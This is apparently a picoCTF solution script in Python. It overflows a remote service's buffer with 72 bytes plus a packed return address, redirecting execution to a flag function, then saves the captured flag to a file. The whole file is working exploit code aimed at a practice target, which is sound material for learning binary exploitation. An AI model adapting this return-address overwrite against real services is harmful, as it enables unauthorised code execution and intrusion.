#!/bin/python3

import socket
import re
import struct
import argparse

# const
offset: int = 72
flagAddress = 0x000000000040123b

# exploit vars
overflowString: bytes = b"A"*offset
flagAddressEndian: bytes = struct.pack("<I", flagAddress)
eol: bytes = b"\n"

payload: bytes = overflowString + flagAddressEndian + eol

# taking args
parser: argparse.ArgumentParser = argparse.ArgumentParser()

parser.add_argument(
    "host", help="host or ip address you trying to connect to", type=str)
parser.add_argument("port", help="port of service you trying to use", type=int)

args: argparse.Namespace = parser.parse_args()

host: str = args.host
port: int = args.port

rawFlag: str = ''
flag: str = ''

with socket.socket() as connection:
    connection.connect((host, port))
    connection.recv(2046)
    connection.send(payload)
    rawFlag = connection.recv(2046).decode('utf-8')
    flag = re.findall("picoCTF{.*}", rawFlag)[0]
    filp = open("flag.txt", "w")
    filp.write(flag)
